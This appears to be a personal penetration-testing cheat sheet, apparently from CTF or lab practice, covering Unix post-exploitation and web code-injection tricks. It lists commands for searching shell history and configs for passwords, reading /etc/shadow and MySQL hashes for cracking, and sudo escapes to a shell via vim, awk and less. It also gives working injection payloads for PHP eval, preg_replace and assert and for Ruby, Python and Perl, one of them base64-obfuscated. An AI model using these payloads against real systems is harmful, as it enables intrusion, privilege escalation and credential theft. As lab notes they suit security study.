# Unix

* ;,||,&& promotes code injection `ping 1010101; cat pass.txt`
* .bash_history contains history (in victims home dir)
* * find /home -name .bash_history
* * find /home -name .bashrc -exec grep -H [key || export] {} \; `For alias`
* * find . -name .\*sh_history
* * find . -name .bash_history -exec grep -A 1 '^passwd or su or sudo' {} \; `find user mistake`
* * tar -zxvf (tgz,tar) -jxvf (tbz)
* * bunzip (file) (.bz2)
* * find processes running `ps -edf`
* * `openssl enc -aes256 -k P3NT35T3RL48 -in /tmp/backup.tgz  -out /tmp/backup.tgz.enc` decrypt file with same key `openssl enc -d -aes256 -k P3NT35T3RL48 -in /tmp/backup.tgz.enc -out /tmp/decryp.tgz`
* * find backups `find / -name backup* 2>/dev/null`
* * readable /etc/shadow? decrypt Des | $5$ SHA-256 | $6$ SHA-512 | $1$ MD5CRYPT | $2/a$ Blowfish with john hash
* * find / -name tomcat-(users.xml) 2>/dev/null
* * use mysql -u {user} -p[passw] -> no space
* * mysql passwd `strings /var/lib/mysql/mysql/user.MYD` in mysql acct {merge to similar part to john (username:*3456KSDKFS....{merge lower})}
* * mysql -> select load_file('/var/lib/mysql-files/key.txt'); for older ver
* * psql | \list | \c dbname | \d {show tables} | select stmt {su postgres -> psql}
* * psql {dbname} -U username -W
* * get passwords from configs like db.php etc in /var/www
* * sqlite {dbfile.db} .tables || "select stmt" || .schema (tablename)
* * `sudo -u victim find /home/victim -name key.txt -exec cat {} \;` || `sudo -u victim vim -> ':!/bin/bash'` || `sudo -u victim less :e /path` || `sudo -u victim awk 'BEGIN {system("/bin/sh")}'` || `gcc get.c -o get; sudo -u victim cp get foo;sudo -u victim chmod +xs foo `

```
node -e 
'var exec = require("child_process").exec;
exec("cat /home/victim/key.txt", function (error, stdOut, stdErr) {
console.log(stdOut);
});'
``` 
```    
Read file in postgres
CREATE TABLE demo(t text);
# COPY demo from '[FILENAME]';
# SELECT * FROM demo;   
```

# Essentials

* modify cookies (md5 decode)
* register ('Admin','admin  ')
* check redirects and mod to 200
* check for IDOR
* check file ext (user/1.json)
* Sql ORM user[admin]=true || 0 || 1 -> add to intercept or inject 
* adding related params as above
* use concats (.,+,;) can find which prog running
```
Breaking out of PHP
eval()
By adding dummy code: ".system('uname -a'); $dummy=".
By using comment: ".system('uname -a');# or ".system('uname -a');//.

?order=id;}//: we get an error message (Parse error: syntax error, unexpected ';'). We are probably missing one or more brackets.
?order=id);}//: we get a warning. That seems about right.
?order=id));}//: we get an error message (Parse error: syntax error, unexpected ')' i). We probably have too many closing brackets.
Since we now know how to finish the code correctly (a warning does not stop the execution flow), we can inject arbitrary code and gain code execution using ?order=id);}system('uname%20-a');// for example.
This challenge is based on a vulnerability in PHPMyAdmin: CVE-2008-4096

preg_replace() until php5.5.0
the pattern is evaluated... so breaking it will result to code exec
`/e`
`?new=phpinfo()&pattern=/lamer/e&base=Hello%20lamer`
?new=system(%27whoami%27)&pattern=/lamer/e&base=Hello%20lamer

assert()
?name=hacker%27.phpinfo().%27
```
/usr/local/bin/score 8960b64a-fb41-40dc-ac1f-ac406dc9a461
L3Vzci9sb2NhbC9iaW4vc2NvcmUgODk2MGI2NGEtZmI0MS00MGRjLWFjMWYtYWM0MDZkYzlhNDYx
```
Breaking out of Ruby
/?username=hacker"%2b`uname`%2b"

test 1.to_s
```

```
Breaking out of Python
/?username=hacker"%2bstr(os.popen("whoami").read())%2b" -> "hacker+str(code)+"

hacker"%2bstr(__import__('os').popen("whoami").read())%2b"

hacker"%2bstr(__import__('os').popen(__import__('base64').b64decode('L3Vzci9sb2NhbC9iaW4vc2NvcmUgODk2MGI2NGEtZmI0MS00MGRjLWFjMWYtYWM0MDZkYzlhNDYx')).read())%2b"

test str(1)
```

```
Breaking out of Perl
cgi-bin/hello?name=saide%27.`uname`.%27 -> '.`uname`.'

test 1.to_s
```


